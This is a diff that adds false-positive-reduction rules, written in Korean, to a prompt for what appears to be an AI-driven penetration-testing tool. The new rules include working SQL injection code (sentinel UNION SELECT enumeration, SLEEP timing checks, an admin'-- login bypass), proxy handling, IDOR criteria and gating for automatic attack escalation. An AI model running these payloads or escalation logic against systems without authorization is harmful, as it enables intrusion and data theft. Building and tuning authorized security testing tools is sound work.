@@ -3643,4 +3643,242 @@ _SQLI_PIVOT_AND_PLAYWRIGHT_RULES = """
   ▸ RULE 30-F: Playwright 사용 시 출력 접두어
     print("🎭 [PLAYWRIGHT] {작업 설명}")  # 시작
     print("🎭 [PLAYWRIGHT] 완료: {결과 요약}")  # 완료
+
+# v3.6.3 — RULE 31~38: 오탐 방지 + SOCKS 규칙 강화
+
+  ── RULE 31 [v3.6.3]: 프록시 미설정 시 SOCKS 코드 삽입 절대 금지 ──
+
+  ▸ RULE 31-A [v3.6.3]: [PROXY_ACTIVE] 신호 없으면 PROXIES 변수 생성 금지.
+    스크립트에 SOCKS/Tor 연결 코드를 삽입하는 조건은 단 하나:
+      → bingo 컨텍스트에 [PROXY_ACTIVE: ...] 메시지가 명시적으로 존재해야 한다.
+    VPN 감지, WAF 감지, 익명화 필요 추정 → 이유로 프록시 자동 삽입 금지.
+
+    WRONG — [PROXY_ACTIVE] 없이 프록시 추가:
+      PROXIES = {'http': 'socks5://127.0.0.1:9050', ...}   # ← 컨텍스트에 없으면 절대 금지!
+      PROXIES = {'http': 'socks5h://127.0.0.1:9050', ...}  # ← 동일, 절대 금지!
+
+    CORRECT — [PROXY_ACTIVE] 없으면 그냥 직접 요청:
+      s = requests.Session()
+      s.verify = False
+      r = s.get(url, timeout=15)   # PROXIES 없음 — 정상
+
+    RULE:
+    1. [PROXY_ACTIVE: ...] 신호가 컨텍스트에 명시되지 않으면 → PROXIES 변수 생성 금지.
+    2. Tor, anonymization, VPN 회피 등 이유로 추정해서 PROXIES 추가 → 금지.
+    3. 오직 bingo가 주입한 [PROXY_ACTIVE: <url>] 신호만이 PROXIES 삽입 근거.
+
+  ▸ RULE 31-B [v3.6.3]: SOCKS 연결 실패 ≠ IP 레벨 차단.
+    "SOCKSHTTPConnectionPool", "ProxyError", "SOCKS", "Cannot connect to proxy"
+    류 예외는 IP 차단(방화벽/WAF)이 아닌 프록시 설정 오류 또는 Tor 미실행 문제다.
+    이를 "[IP_BLOCKED]" 또는 "IP 차단 감지"로 출력하지 말 것.
+
+    WRONG:
+      except Exception as e:
+          if "SOCKS" in str(e) or "ProxyError" in str(e):
+              print("[🚫 IP_BLOCKED] IP 차단 → 프록시 설정 필요")  # ← 오탐!
+
+    CORRECT:
+      except Exception as e:
+          err = str(e)
+          if any(k in err for k in ("SOCKS", "ProxyError", "Cannot connect to proxy")):
+              print(f"[⚠️ PROXY-ERROR] 프록시 연결 실패 (Tor 미실행 또는 설정 오류): {err[:100]}")
+          elif "ConnectionRefused" in err or "Connection refused" in err:
+              print(f"[🔌 포트닫힘] 서버가 연결 거부: {err[:80]}")
+          elif "Timeout" in type(e).__name__ or "timed out" in err.lower():
+              print(f"[⏱ TIMEOUT] 응답 없음 (WAF silent drop 가능): {err[:80]}")
+          else:
+              print(f"[연결실패] {type(e).__name__}: {err[:80]}")
+
+  ── RULE 32 [v3.6.3]: SQL 오류 탐지 — 오탐 패턴 명시 금지 ──
+
+  ▸ RULE 32-A [v3.6.3]: "error" 단독 문자열 = SQL 오류 금지.
+    JSON API 응답의 {"msg":"ERROR1"}, {"error":"field"}, HTML 내 단순 "error" 단어는
+    SQL 인젝션 신호가 아니다. 실제 SQL 문법 오류 패턴만 사용할 것.
+
+    WRONG — 광범위한 error 패턴:
+      if "error" in r.text.lower():
+          print("⚠️ SQL 오류 발견!")   # ← "error"는 모든 웹페이지에 존재 → 오탐!
+      if any(k in r.text.lower() for k in ["error", "warning", "mysql"]):
+          sql_error = True            # ← 오탐!
+
+    CORRECT — 실제 SQL 문법 오류 패턴만 사용:
+      import re
+      _SQL_ERR = [
+          re.compile(r"you have an error in your sql syntax", re.I),
+          re.compile(r"unclosed quotation mark after the character string", re.I),
+          re.compile(r"quoted string not properly terminated", re.I),
+          re.compile(r"\bora-\d{5}:", re.I),
+          re.compile(r"pg_query\(\):.*?failed", re.I),
+          re.compile(r"sqlite3\.OperationalError", re.I),
+          re.compile(r"XPATH syntax error", re.I),
+          re.compile(r"Warning.*?mysql_(?:fetch|num|query)", re.I),
+          re.compile(r"supplied argument is not a valid MySQL", re.I),
+          re.compile(r"\[Microsoft\]\[ODBC SQL Server Driver\]", re.I),
+          re.compile(r"Microsoft OLE DB Provider for SQL Server error", re.I),
+          re.compile(r"Incorrect syntax near ['\"]", re.I),
+      ]
+      sql_error_confirmed = any(p.search(r.text) for p in _SQL_ERR)
+      if sql_error_confirmed:
+          print(f"⚠️ 실제 SQL 문법 오류 탐지: {r.text[:200]}")
+
+  ▸ RULE 32-B [v3.6.3]: "mysql" 키워드 베이스라인 차분 확인 필수.
+    많은 웹 페이지는 HTML, 주석, 기술 공개 등으로 "mysql" 단어를 포함한다.
+    베이스라인(정상 파라미터) 응답에 "mysql"이 이미 있으면 인젝션 신호로 쓸 수 없다.
+
+    WRONG:
+      if "mysql" in r.text.lower():
+          mysql_keyword = True   # ← 원본 페이지에도 있으면 오탐!
+
+    CORRECT:
+      base_r = session.get(url, params={"id": "1"}, timeout=10, verify=False)
+      base_has_mysql = "mysql" in base_r.text.lower()
+
+      inj_r = session.get(url, params={"id": "1'"}, timeout=10, verify=False)
+      if "mysql" in inj_r.text.lower() and not base_has_mysql:
+          print("⚠️ mysql 키워드 인젝션 후 신규 등장 → 의미 있는 신호")
+      else:
+          print("mysql은 원본 페이지에도 존재 → 인젝션 신호 아님, 무시")
+
+  ── RULE 33 [v3.6.3]: UNION SELECT — 반사(Reflection) vs 실행 구분 ──
+
+  ▸ RULE 33-A [v3.6.3]: 열수 증가마다 응답 크기가 선형 증가 = 반사, UNION 실행 아님.
+    UNION SELECT NULL,NULL,...,NULL 테스트에서 NULL 개수가 늘수록 응답 크기가
+    ~5~7B씩 선형 증가한다면 → 페이로드가 HTML에 그대로 반사된 것, 실행 성공 아님.
+    실제 UNION 실행 확인은 sentinel 문자열로만 한다.
+
+    WRONG — 크기 증가를 UNION 성공으로 오탐:
+      for cols in range(1, 20):
+          payload = f"' UNION SELECT {','.join(['NULL']*cols)}--"
+          r = session.get(url, params={"id": payload}, ...)
+          if len(r.content) > baseline_size + 10:
+              print(f"✅ UNION {cols}열 성공!")   # ← 반사일 수 있음!
+
+    CORRECT — sentinel 값으로 실제 DB 실행 확인:
+      SENTINEL = "BINGO_7x9z_TEST"
+      success_cols = None
+      for cols in range(1, 20):
+          for i in range(cols):
+              nulls = ["NULL"] * cols
+              nulls[i] = f"'{SENTINEL}'"
+              payload = "' UNION SELECT " + ",".join(nulls) + "--"
+              r = session.get(url, params={"id": payload}, timeout=10, verify=False)
+              if SENTINEL in r.text:
+                  print(f"✅ UNION {cols}열 성공! 열{i+1}에서 데이터 출력 확인")
+                  success_cols = cols
+                  break
+          if success_cols:
+              break
+      if not success_cols:
+          print("❌ UNION sentinel 미탐지 → 반사 또는 UNION 불가. 다른 기법으로 전환.")
+
+  ── RULE 34 [v3.6.3]: Time-based SQLi — SLEEP 실행 검증 강제 ──
+
+  ▸ RULE 34-A [v3.6.3]: SLEEP(N)과 SLEEP(M) 응답 시간이 N-M 미만 차이 = WAF 차단, 성공 아님.
+    SLEEP(3)→0.42s, SLEEP(5)→0.37s 처럼 거의 같으면 WAF가 SLEEP 함수를 차단 중이다.
+    이 경우 "WAF 우회 성공" 또는 "time-based 확인"으로 표시 금지.
+
+    WRONG:
+      # SLEEP(3)→0.42s, SLEEP(5)→0.37s 결과를 보고:
+      print("✅ 타임기반 SQLi WAF 우회 성공!")   # ← SLEEP 실행 안 됨!
+
+    CORRECT — SLEEP 실행 검증 함수 반드시 사용:
+      import time
+      def _verify_sleep(session, url, make_params, n=5, tol=1.0):
+          t0 = time.time(); session.get(url, params=make_params(0), timeout=10, verify=False)
+          base_t = time.time() - t0
+          t1 = time.time(); session.get(url, params=make_params(n), timeout=n+6, verify=False)
+          inj_t = time.time() - t1
+          delay = inj_t - base_t
+          if delay >= n - tol:
+              print(f"✅ SLEEP({n}) 확인! 지연={delay:.2f}s"); return True
+          print(f"❌ SLEEP 미실행: 지연={delay:.2f}s < {n-tol:.1f}s → WAF SLEEP 차단 중")
+          return False
+
+      if not _verify_sleep(session, url, lambda s: {"id": f"1' AND SLEEP({s})--"}):
+          print("→ time-based 채널 불가. error-based 또는 boolean으로 전환.")
+
+  ── RULE 35 [v3.6.3]: 응답 본문 출력 크기 제한 — CSS/JS 전체 덤프 금지 ──
+
+  ▸ RULE 35-A [v3.6.3]: HTML/CSS/JS 응답을 500자 이상 그대로 출력하지 말 것.
+    관리자 페이지, 스타일시트, JS 파일 전체를 출력하면 로그 오염 + 토큰 낭비.
+
+    WRONG:
+      print(r.text)                          # CSS/JS 수천 줄 전체 덤프
+      print(r.text[:3000])                   # 여전히 CSS 수천 자
+
+    CORRECT — CSS/JS 제거 후 핵심 스니펫만:
+      import re as _re
+      def _snippet(text, max_len=300):
+          t = _re.sub(r'<style[^>]*>.*?</style>', '[CSS]', text, flags=_re.DOTALL)
+          t = _re.sub(r'<script[^>]*>.*?</script>', '[JS]', t, flags=_re.DOTALL)
+          return t[:max_len].replace("\n"," ").replace("\t"," ")
+
+      print(f"  [{r.status_code}/{len(r.content)}B] {_snippet(r.text)!r}")
+
+  ── RULE 36 [v3.6.3]: credential 취약점 — 로그인 폼 존재 ≠ 취약점 ──
+
+  ▸ RULE 36-A [v3.6.3]: /admin, /login 경로에 username+password 폼이 존재하는 것은
+    정상 기능이며 credential 취약점(BINGO-*)을 생성할 근거가 아니다.
+
+    credential 취약점 성립 조건 (하나 이상 충족 필수):
+      (a) 실제 DB에서 크리덴셜(username + password hash/plain) 추출 성공
+      (b) 인증 우회 SQLi로 관리자 패널 실제 진입 확인 (logout 링크, admin UI 확인)
+      (c) API 응답에 password 필드가 평문 또는 해시로 노출
+      (d) 기본 크리덴셜(admin/admin, admin/1234)로 실제 로그인 성공
+
+    WRONG:
+      if "password" in r.text and "/admin" in url:
+          create_finding("BINGO-credential", "CRITICAL")  # ← 로그인 폼 = 정상!
+
+    CORRECT:
+      login_r = session.post(login_url, data={"id":"admin'--","pw":"x"}, verify=False)
+      if any(k in login_r.text for k in ("로그아웃","logout","관리자 패널","dashboard")):
+          print("✅ 인증 우회 성공 → credential 취약점 [CONFIRMED]")
+      else:
+          print("[-] 로그인 폼 존재 = 정상 기능, credential 취약점 아님")
+
+  ── RULE 37 [v3.6.3]: IDOR — 공개 자원 접근 ≠ IDOR ──
+
+  ▸ RULE 37-A [v3.6.3]: 공개 게시물 /board?id=1,2,3 순차 접근이 전부 200이면 IDOR 아님.
+    IDOR은 인가된 범위 밖 자원(다른 사용자의 비공개 데이터)에 접근할 때 성립.
+
+    WRONG:
+      for id in range(1, 50):
+          r = session.get(f"{url}?id={id}")
+          if r.status_code == 200:
+              print(f"[IDOR] id={id} 접근 성공!")   # ← 공개 게시물 = 정상!
+
+    CORRECT — 인가 경계 교차 테스트:
+      # 시나리오: 계정A 토큰으로 계정B의 비공개 자원 접근
+      # 또는: 일반 사용자로 관리자 전용 오브젝트 접근
+      # 단순 공개 페이지 순차 접근은 IDOR 조건 불충족 → 기록 없음
+
+  ── RULE 38 [v3.6.3]: 자동 에스컬레이션 — 오탐 신호 기반 금지 ──
+
+  ▸ RULE 38-A [v3.6.3]: 이전 단계 취약점이 [CONFIRMED]/[VERIFIED]가 아니면
+    다음 단계 공격을 자동으로 실행하지 말 것.
+
+    에스컬레이션 허용 조건:
+      (a) 이전 단계에서 [CONFIRMED] 또는 [VERIFIED] 표시 취약점 존재
+      (b) 실제 데이터(DB 행, 파일 내용, RCE 출력)가 응답에서 추출된 경우
+
+    에스컬레이션 금지 (하나라도 해당 시):
+      (x) 이전 단계가 [SUSPECTED ⚠️] 또는 단일 신호만 존재
+      (x) SQL 오류가 광범위한 "error" 문자열 매칭으로만 탐지
+      (x) mysql 키워드가 베이스라인 응답에도 이미 존재
+      (x) UNION sentinel 값이 응답에 없음 (반사 오탐)
+      (x) SLEEP 타이밍 차이가 N-1초 미만 (WAF 차단)
+      (x) credential 신호가 로그인 폼 존재만으로 생성
+      (x) IDOR 신호가 공개 게시물 순차 접근으로만 발생
+
+    CORRECT:
+      reliable_signals = sum([
+          sql_error_confirmed,    # RULE 32-A 기준 실제 SQL 오류 패턴
+          union_sentinel_found,   # RULE 33-A sentinel 값 응답 확인
+          sleep_delay_verified,   # RULE 34-A SLEEP 실제 지연 확인
+      ])
+      if reliable_signals >= 2:
+          escalate_to_next_phase()
+      else:
+          print(f"⚠️ 신뢰 신호 {reliable_signals}개 — 에스컬레이션 보류, 다른 벡터 탐색")
 """
